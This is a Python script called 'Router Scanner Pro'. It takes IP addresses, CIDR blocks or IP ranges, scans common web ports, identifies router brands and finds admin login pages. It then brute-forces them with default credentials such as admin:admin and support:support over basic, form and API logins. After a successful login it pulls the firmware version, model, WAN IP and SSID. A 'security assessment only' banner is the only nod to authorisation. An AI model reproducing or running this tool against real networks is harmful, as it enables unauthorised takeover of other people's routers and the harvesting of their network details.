#!/usr/bin/env python3
"""
Router Scanner Pro - Professional Network Security Tool
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Live output with hacker theme
Organized scanning with smart prioritization
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'login_pages_found': 0, 'vulnerable_routers': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ROUTER SCANNER PRO - v5.0                                ║
║                    Organized Scanning & Smart Detection                      ║
║                                                                              ║
║  🔍 Smart Brand Detection  |  🔓 Priority-based Testing                    ║
║  🚀 Organized Workflow     |  📊 Clean Professional Output                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}                            [!] For Network Security Assessment Only [!]{Colors.END}
{Colors.WHITE}                              Follow the white rabbit... 🐰{Colors.END}
"""
    print(banner)

# Target credentials
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# Common ports
COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090]

# Brand-specific login paths (Priority 1)
BRAND_PATHS = {
    'tp-link': ['/userRpm/LoginRpm.htm', '/cgi-bin/luci', '/admin', '/login'],
    'huawei': ['/html/index.html', '/asp/login.asp', '/login.cgi', '/admin'],
    'zte': ['/login.gch', '/start.gch', '/getpage.gch', '/admin'],
    'netgear': ['/setup.cgi', '/genie.cgi', '/cgi-bin/', '/admin'],
    'linksys': ['/cgi-bin/webproc', '/cgi-bin/webif', '/admin', '/login'],
    'd-link': ['/login.php', '/login.asp', '/cgi-bin/login', '/admin'],
    'asus': ['/Main_Login.asp', '/Advanced_System_Content.asp', '/admin'],
    'fritzbox': ['/cgi-bin/webcm', '/cgi-bin/firmwarecfg', '/admin'],
    'generic': ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html']
}

# Generic paths (Priority 2)
GENERIC_PATHS = [
    '/manager', '/control', '/config', '/settings', '/system',
    '/dashboard', '/panel', '/console', '/interface'
]

# API paths (Priority 3)
API_PATHS = [
    '/api/login', '/api/auth', '/api/user/login', '/api/admin/login',
    '/rest/login', '/rest/auth', '/rest/user/login',
    '/json/login', '/json/auth', '/json/user/login'
]

class RouterScannerPro:
    def __init__(self, targets, threads=50, timeout=8):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.session = self.create_session()
        self.lock = threading.Lock()
        
    def create_session(self):
        session = requests.Session()
        retry_strategy = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=self.threads, pool_maxsize=self.threads)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        return session
    
    def scan_ports_fast(self, ip):
        open_ports = []
        for port in COMMON_PORTS:
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    def detect_router_brand(self, ip, port):
        """Detect router brand from main page"""
        try:
            url = f"http://{ip}:{port}/"
            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # Brand detection patterns
            brand_indicators = {
                'tp-link': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-'],
                'huawei': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245'],
                'zte': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L'],
                'netgear': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR'],
                'linksys': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'WRT'],
                'd-link': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-'],
                'asus': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC'],
                'fritzbox': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box']
            }
            
            for brand, patterns in brand_indicators.items():
                for pattern in patterns:
                    if pattern.lower() in content or pattern.lower() in headers:
                        return brand
            
            return 'generic'
            
        except:
            return 'generic'
    
    def detect_authentication_type(self, url):
        """Detect authentication type for a specific URL"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 401:
                return 'http_basic', response
            
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # Check for login forms
            if '<form' in content and ('password' in content or 'username' in content):
                return 'form_based', response
            
            # Check for API endpoints
            if any(keyword in content for keyword in ['api', 'json', 'rest', 'ajax']):
                return 'api_based', response
            
            # Check for redirect patterns
            if response.history or 'location' in headers:
                return 'redirect_based', response
            
            return None, response
            
        except:
            return None, None
    
    def test_http_basic_auth(self, ip, port, path, username, password):
        """Test HTTP Basic Authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {encoded_credentials}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code != 401 and response.status_code == 200 and len(response.text) > 500:
                return True, response.url
            
            return False, None
            
        except:
            return False, None
    
    def test_form_based_auth(self, ip, port, path, username, password):
        """Test form-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try different form field combinations
            form_data_variations = [
                {'username': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'passwd': password},
                {'admin': username, 'admin': password},
                {'name': username, 'pwd': password},
                {'username': username, 'password': password, 'login': 'Login'},
                {'user': username, 'pass': password, 'submit': 'Login'},
                {'username': username, 'password': password, 'action': 'login'}
            ]
            
            for form_data in form_data_variations:
                try:
                    response = self.session.post(url, data=form_data, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200 and len(response.text) > 1000:
                        content = response.text.lower()
                        
                        success_indicators = [
                            'admin', 'management', 'configuration', 'settings',
                            'logout', 'status', 'system', 'wireless', 'network',
                            'dashboard', 'control panel', 'router', 'gateway'
                        ]
                        
                        failure_indicators = [
                            'invalid', 'incorrect', 'failed', 'error', 'denied',
                            'wrong', 'login', 'authentication', 'access denied'
                        ]
                        
                        success_count = sum(1 for indicator in success_indicators if indicator in content)
                        failure_count = sum(1 for indicator in failure_indicators if indicator in content)
                        
                        if success_count > failure_count:
                            return True, response.url
                            
                except:
                    continue
            
            return False, None
            
        except:
            return False, None
    
    def test_api_based_auth(self, ip, port, path, username, password):
        """Test API-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try JSON payload
            json_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            
            response = self.session.post(url, json=json_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    if 'success' in str(json_response).lower() or 'token' in str(json_response).lower():
                        return True, url
                except:
                    pass
            
            # Try form data
            form_data = {'username': username, 'password': password}
            response = self.session.post(url, data=form_data, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 200 and len(response.text) > 100:
                content = response.text.lower()
                if 'success' in content or 'token' in content or 'authenticated' in content:
                    return True, url
            
            return False, None
            
        except:
            return False, None
    
    def test_credentials(self, ip, port, path, username, password, auth_type):
        """Test credentials based on authentication type"""
        if auth_type == 'http_basic':
            return self.test_http_basic_auth(ip, port, path, username, password)
        elif auth_type == 'form_based':
            return self.test_form_based_auth(ip, port, path, username, password)
        elif auth_type == 'api_based':
            return self.test_api_based_auth(ip, port, path, username, password)
        else:
            return self.test_form_based_auth(ip, port, path, username, password)
    
    def extract_router_info(self, admin_url, username, password):
        """Extract router information from admin page"""
        info = {}
        
        try:
            # Re-login to ensure session is active
            login_data = {'username': username, 'password': password}
            self.session.post(admin_url, data=login_data, verify=False)
            
            response = self.session.get(admin_url, verify=False)
            content = response.text
            
            # Extract information using regex patterns
            info['firmware_version'] = self.extract_pattern(content, [
                r'firmware[^:]*:?\s*([v\d\.]+)',
                r'version[^:]*:?\s*([v\d\.]+)',
                r'firmware.*?(\d+\.\d+\.\d+)'
            ])
            
            info['model'] = self.extract_pattern(content, [
                r'model[^:]*:?\s*([A-Z0-9\-]+)',
                r'device[^:]*:?\s*([A-Z0-9\-]+)',
                r'product[^:]*:?\s*([A-Z0-9\-]+)'
            ])
            
            info['wan_ip'] = self.extract_pattern(content, [
                r'wan.*?(\d+\.\d+\.\d+\.\d+)',
                r'external.*?(\d+\.\d+\.\d+\.\d+)',
                r'internet.*?(\d+\.\d+\.\d+\.\d+)'
            ])
            
            info['ssid'] = self.extract_pattern(content, [
                r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
            ])
            
            return info
            
        except:
            return {}
    
    def extract_pattern(self, content, patterns):
        """Extract information using regex patterns"""
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return "Unknown"
    
    def scan_single_target(self, ip):
        """Scan a single target with organized workflow"""
        result = {'ip': ip, 'ports': [], 'login_pages': [], 'vulnerabilities': []}
        
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] SCANNING TARGET: {ip}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Phase 1: Port scanning
            print(f"{Colors.YELLOW}[1/4] Port Scanning...{Colors.END}")
            open_ports = self.scan_ports_fast(ip)
            result['ports'] = open_ports
            
            if not open_ports:
                print(f"{Colors.RED}[!] No open ports found{Colors.END}")
                return result
            
            print(f"{Colors.GREEN}[+] Found {len(open_ports)} open ports: {open_ports}{Colors.END}")
            
            # Phase 2: Brand detection and login page discovery
            print(f"{Colors.YELLOW}[2/4] Brand Detection & Login Discovery...{Colors.END}")
            
            for port in open_ports:
                if not running:
                    break
                
                # Detect brand from main page
                brand = self.detect_router_brand(ip, port)
                print(f"{Colors.BLUE}[*] Detected brand: {brand.upper()}{Colors.END}")
                
                # Get priority paths based on brand
                if brand in BRAND_PATHS:
                    priority_paths = BRAND_PATHS[brand] + BRAND_PATHS['generic']
                else:
                    priority_paths = BRAND_PATHS['generic'] + GENERIC_PATHS + API_PATHS
                
                # Test paths in priority order
                login_found = False
                for path in priority_paths:
                    if not running or login_found:
                        break
                    
                    url = f"http://{ip}:{port}{path}"
                    auth_type, response = self.detect_authentication_type(url)
                    
                    if auth_type:
                        print(f"{Colors.GREEN}[+] LOGIN PAGE FOUND: {url} ({auth_type}){Colors.END}")
                        
                        login_info = {
                            'url': url,
                            'port': port,
                            'path': path,
                            'auth_type': auth_type,
                            'brand': brand
                        }
                        result['login_pages'].append(login_info)
                        login_found = True
                        
                        # Phase 3: Brute force attack
                        print(f"{Colors.YELLOW}[3/4] Brute Force Attack...{Colors.END}")
                        
                        for username, password in TARGET_CREDENTIALS:
                            if not running:
                                break
                            
                            print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
                            
                            success, admin_url = self.test_credentials(ip, port, path, username, password, auth_type)
                            
                            if success:
                                print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                                print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                                
                                # Phase 4: Information extraction
                                print(f"{Colors.YELLOW}[4/4] Information Extraction...{Colors.END}")
                                router_info = self.extract_router_info(admin_url, username, password)
                                
                                if router_info:
                                    for key, value in router_info.items():
                                        if value and value != "Unknown":
                                            print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
                                
                                vulnerability = {
                                    'type': 'Default Credentials',
                                    'credentials': f"{username}:{password}",
                                    'admin_url': admin_url,
                                    'auth_type': auth_type,
                                    'router_info': router_info
                                }
                                result['vulnerabilities'].append(vulnerability)
                                
                                with self.lock:
                                    stats['vulnerable_routers'] += 1
                                
                                break
                            else:
                                print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                        
                        if not result['vulnerabilities']:
                            print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
            
            # Update stats
            with self.lock:
                stats['targets_scanned'] += 1
                if result['login_pages']:
                    stats['login_pages_found'] += 1
            
            print(f"{Colors.GREEN}[+] Target {ip} scan completed{Colors.END}")
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error scanning {ip}: {e}{Colors.END}")
            return result
    
    def run_scan(self):
        print(f"{Colors.GREEN}[+] Starting organized scan of {len(self.targets)} targets{Colors.END}")
        print(f"{Colors.YELLOW}[*] Target credentials: {', '.join([f'{u}:{p}' for u, p in TARGET_CREDENTIALS])}{Colors.END}")
        print(f"{Colors.CYAN}[*] Scanning ports: {', '.join(map(str, COMMON_PORTS))}{Colors.END}")
        print(f"{Colors.BLUE}[*] Smart brand detection with priority-based testing{Colors.END}")
        print(f"{Colors.MAGENTA}[*] Organized workflow: Ports → Brand → Login → Brute Force → Info{Colors.END}")
        print("-" * 80)
        
        all_results = []
        
        # Process targets one by one for organized output
        for i, ip in enumerate(self.targets):
            if not running:
                break
            
            result = self.scan_single_target(ip)
            if result:
                all_results.append(result)
            
            # Update progress
            completed = i + 1
            progress = (completed / len(self.targets)) * 100
            
            print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.targets)} ({progress:.1f}%) - "
                  f"Login pages: {stats['login_pages_found']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
        
        return all_results

def parse_targets(target_input):
    targets = []
    
    if '/' in target_input:  # CIDR
        import ipaddress
        network = ipaddress.IPv4Network(target_input, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_input:  # IP range
        start_ip, end_ip = target_input.split('-')
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        for a in range(start[0], end[0] + 1):
            for b in range(start[1], end[1] + 1):
                for c in range(start[2], end[2] + 1):
                    for d in range(start[3], end[3] + 1):
                        targets.append(f"{a}.{b}.{c}.{d}")
    elif target_input.endswith('.txt'):  # File
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.END}")
            return []
    else:  # Single IP
        targets = [target_input]
    
    return targets

def main():
    parser = argparse.ArgumentParser(description="Router Scanner Pro v5.0 - Organized Scanning & Smart Detection")
    parser.add_argument('-t', '--targets', required=True, help='Target IP(s): single IP, CIDR, range, or file')
    parser.add_argument('-T', '--threads', type=int, default=1, help='Number of threads (default: 1 for organized output)')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout in seconds (default: 8)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    targets = parse_targets(args.targets)
    if not targets:
        print(f"{Colors.RED}[!] No valid targets found{Colors.END}")
        return
    
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")
    
    scanner = RouterScannerPro(targets, args.threads, args.timeout)
    stats['start_time'] = time.time()
    
    try:
        results = scanner.run_scan()
        
        if results:
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] SCAN COMPLETE!{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total targets scanned: {len(results)}")
            print(f"  - Login pages found: {stats['login_pages_found']}")
            print(f"  - Vulnerable routers: {stats['vulnerable_routers']}")
            print(f"  - Scan duration: {total_time:.1f} seconds")
            print(f"  - Average speed: {len(results)/total_time:.1f} targets/second")
            print(f"{Colors.BLUE}[*] Organized workflow completed successfully{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")

if __name__ == "__main__":
    main()